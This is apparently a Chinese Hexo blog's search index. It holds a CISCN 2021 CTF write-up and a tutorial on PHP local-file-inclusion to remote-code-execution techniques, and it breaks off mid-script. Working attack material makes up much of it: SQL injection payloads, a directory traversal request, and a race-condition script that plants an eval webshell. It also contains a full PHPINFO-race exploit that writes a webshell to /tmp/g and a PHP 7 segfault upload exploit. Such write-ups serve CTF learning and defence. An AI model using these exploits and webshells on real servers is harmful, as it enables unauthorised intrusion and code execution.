<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>第十四届全国大学生信息安全竞赛部分wp</title>
    <link href="/2021/05/18/easy_sql/"/>
    <url>/2021/05/18/easy_sql/</url>
    
    <content type="html"><![CDATA[<h1 id="第十四届全国大学生信息安全竞赛部分wp"><a href="#第十四届全国大学生信息安全竞赛部分wp" class="headerlink" title="第十四届全国大学生信息安全竞赛部分wp"></a>第十四届全国大学生信息安全竞赛部分wp</h1><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>进来是个登录界面，sqlmap能跑出部分信息。</p><p>fuzz后发现过滤</p><pre><code>unioninformationcolumninno</code></pre><p>无列名注入</p><p>注列名</p><p>payload</p><pre><code>uname=123&#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag as a join flag as b using(id)as c),0x7e)))#&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95</code></pre><p>得到no字段。</p><p>注字段名</p><p>Payload:</p><pre><code>uname=123&#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag as a join flag as b using(id,no))as c),0x7e)))#&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95</code></pre><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" srcset="/img/loading.gif" alt="图形用户界面, 应用程序  描述已自动生成"></p><p>再通过字段名去注flag。得到后半截。</p><p>Payload：</p><pre><code>uname=123123&#39;) and (extractvalue(1,concat(0x7e,(select SUBSTRING(`f8ccfe58-fdc5-4641-b5b4-3448403d1ffe`,10,32) from flag),0x7e)))#&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%</code></pre><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" srcset="/img/loading.gif" alt="图形用户界面, 文本, 应用程序  描述已自动生成"></p><p>改一下获得后半截flag。</p><p>Payload：</p><pre><code>uname=123123&#39;) and (extractvalue(1,concat(0x7e,(select SUBSTRING(`f8ccfe58-fdc5-4641-b5b4-3448403d1ffe`,1,10) from flag),0x7e)))#&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%</code></pre><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" srcset="/img/loading.gif" alt="图形用户界面, 文本  描述已自动生成"></p><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>原题 = =</p><p>进来啥也没有，扫后台得到源码.index.php.swo。</p><pre class=" language-php"><code class="language-php">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？<span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">d</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">i</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">j</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">k</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">l</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">m</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">n</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">o</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">r</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">t</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$rc</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"rc"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$rb</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"rb"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ra</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ra"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$rd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"rd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$method</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$rc</span><span class="token punctuation">(</span><span class="token variable">$ra</span><span class="token punctuation">,</span> <span class="token variable">$rb</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$rd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>–&gt;php反射</p><p>参数是：?rc=ReflectionMethod&amp;ra=User&amp;rb=x&amp;rd=getDocComment</p><p>由于不知道rb是什么，进行a-z爆破</p><p>爆出来是q，回显得到flag。</p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" srcset="/img/loading.gif" alt="图形用户界面, 文本, 应用程序, 电子邮件  描述已自动生成"></p><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>扫描后台发现.listing文件，得到新文件.listing</p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg" srcset="/img/loading.gif" alt="img"></p><pre><code>Post cf=..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fyou_can_seeeeeeee_me.php</code></pre><p>目录穿越得到phpinfo,得到session文件的绝对路径/var/lib/php/sessions/dfdcdhgbfc。</p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg" srcset="/img/loading.gif" alt="图形用户界面, 文本, 应用程序, 电子邮件  描述已自动生成"></p><p>利用session.upload_progress进行文件包含，根据提示用条件竞争查看/etc下目录</p><p>下面是jio本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token comment" spellcheck="true">#var_dump(scandir('/etc/iigbdccdij/dfajiafcea/gddfeeafaf/hahcdhbgfd/gbidbdefde/fl444444g'));</span>sessid <span class="token operator">=</span> <span class="token string">'flag'</span>datas <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"cf"</span><span class="token punctuation">:</span><span class="token string">"../../../../var/lib/php/sessions/dfdcdhgbfc/sess_flag"</span><span class="token punctuation">,</span><span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">"echo file_get_contents('/etc/iigbdccdij/dfajiafcea/gddfeeafaf/hahcdhbgfd/gbidbdefde/fl444444g');"</span><span class="token punctuation">}</span>url <span class="token operator">=</span> <span class="token string">"http://124.70.14.200:22355/"</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?>'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'ff.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>datas<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'ff.txt'</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>然后就是套娃，套到最后得到fl444444g。</p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg" srcset="/img/loading.gif" alt="文本  描述已自动生成"></p><p>读文件得到flag。</p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg" srcset="/img/loading.gif" alt="img"></p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg" srcset="/img/loading.gif" alt="img"></p><h2 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h2><p>根据密文格式推测为短信PDU</p><p>用在线工具解码</p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg" srcset="/img/loading.gif" alt="文本  中度可信度描述已自动生成"></p><p>第二段密文提示手机号前八位 – 15030442</p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image026.jpg" srcset="/img/loading.gif" alt="手机屏幕截图  描述已自动生成"></p><p>继续往下解</p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg" srcset="/img/loading.gif" alt="文本  描述已自动生成"></p><p>下面全是这样的数据段，手撸把所有密文解出来。</p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg" srcset="/img/loading.gif" alt="图形用户界面, 文本, 应用程序, 聊天或短信  描述已自动生成"></p><p>最后按时间顺序拼成(笨比方法)</p><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image031.jpg" srcset="/img/loading.gif" alt="文本  描述已自动生成"></p><p>和前面的电话号连一起</p><p>CISCN{15030442_b586_4c9e_b436_26def12293e4}</p><p>得到flag。</p><p> 有脚本能直接排列 = = 找不着了</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LFI RCE总结</title>
    <link href="/2021/03/20/LFI%20RCE%E6%80%BB%E7%BB%93/"/>
    <url>/2021/03/20/LFI%20RCE%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="LFI-RCE总结"><a href="#LFI-RCE总结" class="headerlink" title="LFI RCE总结"></a>LFI RCE总结</h1><p>​    PHP LFI即本地文件包含漏洞，通过包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等达到拿服务器权限的目的。</p><a id="more"></a><p>​    比较常用的方法有：PHPINFO()和 PHP7 Segment Fault。他们的基本原理都是向服务器上传生成恶意的临时文件，再对恶意文件进行包含即可RCE。</p><h2 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h2><p><strong>文件名</strong></p><p>由于临时文件名是由随机函数生成的，我们需要获取正确的文件名，也就是<code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>。</p><p><strong>存储目录及命名规律</strong></p><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的upload_tmp_dir属性指定，假如upload_tmp_dir的路径不可写，PHP会上传到系统默认的临时目录中。</p><p>了解不同系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。</p><p><u>linux</u>：</p><p>路径 — /tmp/</p><p>命名规则 — /tmp/php[6个随机字符]</p><p><u>windows</u>:</p><p>路径 — C:/Windows/<br>              C:/Windows/Temp/</p><p>命名规则 — C:/Windows/php[4个随机字符].tmp</p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO()"></a>PHPINFO()</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。</p><p>这可以很好的帮助我们寻找文件名，因为phpinfo页面会将当前请求上下文中所有变量都打印出来（包括$_GET，$<strong>POST,$</strong>FILES)。所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，拿到临时文件变量名之后，就可以进行包含执行我们传入的恶意代码。</p><h4 id="测试特性脚本"><a href="#测试特性脚本" class="headerlink" title="测试特性脚本"></a>测试特性脚本</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsfiles <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"a.txt"</span><span class="token punctuation">,</span><span class="token string">"123123"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>url <span class="token operator">=</span> <span class="token string">"http://172.17.0.1：8080/phpinfo.php"</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>与版本无关，属于PHPINFO自身特性。</p><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>​    我们先向PHPINFO发送数据包上传文件，在回显中得到临时文件名，到这里是第一个请求。之后发起第二个请求，把得到的临时文件名发送给存在文件包含漏洞的界面去getshell。</p><p>​    然而当第一个请求结束时，临时文件就已经被删除了。</p><p>​    所以这里用到条件竞争来实现目的。</p><p>​    具体流程如下：</p><blockquote><p>参考：<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a></p></blockquote><ol><li>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</li><li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li><li>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</li><li>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li><li>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li><li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell。</li></ol><pre><code> python exp.py your-ip 8080 100</code></pre><p>EXP</p><pre class=" language-PHP"><code class="language-PHP">#!/usr/bin/python import sysimport threadingimport socketdef setup(host, port):    TAG="Security Test"    PAYLOAD="""%s\r<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG    REQ1_DATA="""-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name="dummyname"; filename="test.txt"\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r""" % PAYLOAD    padding="A" * 5000    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\rHTTP_ACCEPT: """ + padding + """\rHTTP_USER_AGENT: """+padding+"""\rHTTP_ACCEPT_LANGUAGE: """+padding+"""\rHTTP_PRAGMA: """+padding+"""\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s""" %(len(REQ1_DATA),host,REQ1_DATA)    #modify this to suit the LFI script       LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\r\r\r"""    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = ""    while len(d) < offset:        d += s.recv(offset)    try:        i = d.index("[tmp_name] =&gt; ")        fn = d[i+17:i+31]    except ValueError:        return None    s2.send(lfireq % (fn, host))    d = s2.recv(4096)    s.close()    s2.close()    if d.find(tag) != -1:        return fncounter=0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter >= self.maxattempts:                    return                counter+=1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                                if x:                    print "\nGot it! Shell created in /tmp/g"                    self.event.set()            except socket.error:                returndef getOffset(host, port, phpinforeq):    """Gets offset of tmp_name in the php output"""    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)    d = ""    while True:        i = s.recv(4096)        d+=i                if i == "":            break        # detect the final chunk        if i.endswith("0\r\n\r\n"):            break    s.close()    i = d.find("[tmp_name] =&gt; ")    if i == -1:        raise ValueError("No php tmp_name in phpinfo output")    print "found %s at %i" % (d[i:i+10],i)    # padded up a bit    return i+256def main():    print "LFI With PHPInfo()"    print "-=" * 30    if len(sys.argv) < 2:        print "Usage: %s host [port] [threads]" % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print "Error with hostname %s: %s" % (sys.argv[1], e)        sys.exit(1)    port=80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print "Error with port %d: %s" % (sys.argv[2], e)        sys.exit(1)    poolsz=10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print "Error with poolsz %d: %s" % (sys.argv[3], e)        sys.exit(1)    print "Getting initial offset...",      reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print "Spawning worker pool (%d)..." % poolsz    sys.stdout.flush()    tp = []    for i in range(0,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))                sys.stdout.flush()                if counter >= maxattempts:                    break        print        if e.is_set():            print "Woot!  \m/"        else:            print ":("    except KeyboardInterrupt:        print "\nTelling threads to shutdown..."        e.set()    print "Shuttin' down..."    for t in tp:        t.join()if __name__=="__main__":    main()</code></pre><h2 id="php7-Segment-Fault"><a href="#php7-Segment-Fault" class="headerlink" title="php7 Segment Fault"></a>php7 Segment Fault</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​    当目标不存在phpinfo,可以利用php7 segment fault特性（<a href="https://bugs.php.net/bug.php?id=75535" target="_blank" rel="noopener">CVE-2018-14884</a>）。</p><p>​    php代码中使用php://filter的过滤器<code>strip_tags</code> , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会执行 , 因此POST 的文件会保存在系统的缓存目录下不会被删除，这样的情况下我们只需要知道其文件名就可以包含恶意代码。</p><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>7.0.0 &lt;= PHP Version &lt; 7.0.28</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><pre><code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code></pre><p>​    这种包含会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在upload_tmp_dir所指定的目录下，不会被删除，这样就能达成getshell的目的。</p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>PHP 7.0.9</p><p><strong>TIPS1</strong> </p><p>通过dir.php查找临时文件。</p><p>LINUX exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#python version 2.7</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> refiles <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'&lt;?php eval($_REQUEST[Qftm]);'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>url1 <span class="token operator">=</span> <span class="token string">'http://172.17.0.1:8080/index.php?file=php://filter/string.strip_tags/resource=index.php'</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>url2 